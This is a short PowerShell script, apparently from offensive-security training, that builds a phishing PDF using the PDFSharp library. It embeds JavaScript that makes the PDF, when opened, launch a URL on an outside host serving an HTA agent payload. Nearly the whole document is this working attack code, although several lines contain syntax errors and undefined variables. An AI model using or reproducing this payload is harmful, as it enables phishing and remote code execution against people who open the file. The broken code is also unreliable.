# Create document with malicious PDF for a phishing attack
# Utilizes .NET objects in PDFSharp DLL, C# interface, PSV2 and later
# Running things inside of hta/document more often gives privliges

Add-Type -Path C:\pdf\PdfSharp-WPF.dll
$doc = New-Object PdfSharp.Pdf.PdfDocument
$docInfo.Title = "Phishing POC"
$js="app.launchURL('http://kittenwar.sec660.org/agent.hta')"
doc.info.Creator = "@Author"
$page = $doc.AddPage()
$dictjs = New-Object PdfSharp.Pdf.PdfDictionary
$dictjs.Elements["/S"] = New-Object PdfSharp.Pdf.PdfName ("/JavaScript")
$dictjs.Elements["/JS"] = New-Object PdfSharp.Pdf.PdfStringObject ($doc, $js)
$doc.Internals.AddObject($dictjs)
$dict = New-Object PdfSharp.Pdf.PdfDictionary
$pdfarray = NewObject PdfSharp.Pdf.PdfArray
$embeddedstring = New-Object PdfSharp.Pdf.PdfString("EmbeddedJS")
$dict.Elements["/Names" = $pdfarray
$pdfarray.Elements.Add($embeddedstring)
$pdfarray.Elements.Add($dictjs.Reference)
$doc.Internals.AddObject($dict)
$dictgroup = New-Object PdfSharp.Pdf.PdfDictionary
$dictgroup.Elements["/JavaScript" = $dict.Reference
doc.Internals.Catalog.Elements["/Names"] = $dictgroup
doc.Save(filename)
